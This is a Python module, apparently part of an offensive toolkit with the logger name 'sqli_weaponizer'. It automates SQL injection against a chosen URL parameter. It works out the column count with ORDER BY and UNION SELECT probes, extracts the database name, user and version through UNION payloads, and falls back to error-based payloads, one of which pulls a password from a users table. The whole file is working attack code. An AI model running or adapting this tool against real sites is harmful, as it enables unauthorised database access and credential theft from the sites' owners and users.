import re
from typing import Dict, List, Optional

import requests

from tools._session import make_session
from tools.log_utils import get_logger

logger = get_logger("sqli_weaponizer")


def _build_url(url: str, param: str, payload: str) -> str:
    sep = "&" if "?" in url else "?"
    return f"{url}{sep}{param}={payload}"


def _probe_column_count(url: str, param: str, sess: requests.Session, timeout: float) -> int:
    for n in range(1, 20):
        try:
            r = sess.get(_build_url(url, param, f"' ORDER BY {n}-- "), timeout=timeout)
            if r.status_code != 200 or "error" not in r.text.lower():
                continue
        except Exception as e:
            logger.debug("col_count ORDER BY %d: %s", n, e)
    for n in [1, 2, 3, 4, 5, 6, 7, 8, 10, 12, 15, 20]:
        try:
            r = sess.get(_build_url(url, param, f"' UNION SELECT {','.join(['NULL']*n)}-- "), timeout=timeout)
            body_lower = r.text.lower()
            if r.status_code == 200 and "error" not in body_lower and "unexpected" not in body_lower and r.text != "":
                return n
        except Exception as e:
            logger.debug("col_count UNION %d: %s", n, e)
    return 3


def _extract_via_union(url: str, param: str, cols: int, sess: requests.Session, timeout: float) -> list:
    data = []
    nulls = ",".join(["NULL"] * cols)
    payload_templates: List[tuple] = [
        ("' UNION SELECT %s, DATABASE() FROM information_schema.tables-- ", "database"),
        ("' UNION SELECT %s, USER() FROM information_schema.tables-- ", "user"),
        ("' UNION SELECT %s, @@VERSION FROM information_schema.tables-- ", "version"),
    ]
    payloads = [(t % nulls, label) for t, label in payload_templates]
    for payload, label in payloads:
        try:
            r = sess.get(_build_url(url, param, payload), timeout=timeout)
            text = r.text[:2000]
            matches = re.findall(r'([a-zA-Z][\w@\.\-:]{5,})', text)
            matches = [m for m in matches if any(c in m for c in '@.:/') or (len(m) >= 12 and not m.isdigit())]
            if matches:
                data.append({"source": f"union_{label}", "values": matches[:10]})
        except Exception as e:
            logger.debug("union extract %s: %s", label, e)
    return data


def check(url: str, param: str, sess: Optional[requests.Session] = None,
          timeout: float = 10.0) -> Dict:
    sess = sess or make_session()
    result = {"vulnerable": False, "data": [], "type": None, "column_count": None}

    cols = _probe_column_count(url, param, sess, timeout)
    result["column_count"] = cols

    if cols:
        extracted = _extract_via_union(url, param, cols, sess, timeout)
        if extracted:
            result["vulnerable"] = True
            result["data"].extend(extracted)
            result["type"] = "union"

    if not result["vulnerable"]:
        error_payloads = [
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE())))-- ",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT USER())))-- ",
            "' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INT)-- ",
        ]
        for payload in error_payloads:
            try:
                r = sess.get(_build_url(url, param, payload), timeout=timeout)
                m = re.search(r'~(.+?)[\'"]', r.text)
                if m:
                    result["vulnerable"] = True
                    result["data"].append({"source": "error_based", "value": m.group(1)[:100]})
                    result["type"] = "error_based"
                    break
            except Exception as e:
                logger.debug("error extract: %s", e)

    return result
